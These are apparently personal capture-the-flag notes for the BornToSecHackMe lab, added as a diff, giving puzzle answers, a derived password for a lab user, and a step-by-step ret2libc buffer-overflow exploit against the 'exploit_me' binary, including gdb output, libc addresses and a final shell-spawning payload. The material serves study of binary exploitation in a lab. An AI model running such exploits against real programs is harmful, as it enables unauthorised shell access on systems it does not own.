@@ -1,0 +1,82 @@
+"Publicspeakingisveryeasy.126241207202b7559giants426315"
+"Publicspeakingisveryeasy.126241207201b2149o`ekma426315"
+Publicspeakingisveryeasy.126241207201b2149opukmq426315
+P119O4
+b9giants
+
+opekma,
+opekmq,
+opukma,
+opukmq
+
+giants
+o
+isrveawhobpnutfg
+opekmq
+
+password thor: Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+run $(python -c 'print "\x55" * 140 + "system addr" + "\bin\sh addr"')
+
+checksec --file=exploit_me 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   66 Symbols  No	0		1		exploit_me
+
+get the systyem addr :
+
+disass system
+Dump of assembler code for function system:
+   0xb7e6b060 <+0>:     sub    $0x1c,%esp
+   0xb7e6b063 <+3>:     mov    %esi,0x14(%esp)
+   0xb7e6b067 <+7>:     mov    0x20(%esp),%esi
+   0xb7e6b06b <+11>:    mov    %ebx,0x10(%esp)
+   0xb7e6b06f <+15>:    call   0xb7f56c73
+   0xb7e6b074 <+20>:    add    $0x165f80,%ebx
+   0xb7e6b07a <+26>:    mov    %edi,0x18(%esp)
+   0xb7e6b07e <+30>:    test   %esi,%esil
+   0xb7e6b080 <+32>:    je     0xb7e6b0a8 <system+72>
+   0xb7e6b082 <+34>:    mov    %gs:0xc,%eax
+   0xb7e6b088 <+40>:    test   %eax,%eax
+
+info proc :
+
+info proc map
+process 1965
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+---Type <return> to continue, or q <return> to quit---
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+zaz@BornToSecHackMe:~$ strings -a -t x /lib/i386-linux-gnu/libc-2.15.so | grep "/bin/sh"
+160c58 /bin/sh
+
+(gdb) print/x (0xb7e2c000 + 0x160c58)
+$2 = 0xb7f8cc58
+
+
+system 0xb7e6b060
+exit 0xb7e5ebe0
+/bin/sh 0xb7f8cc58
+
+./exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
+
+usefull : https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
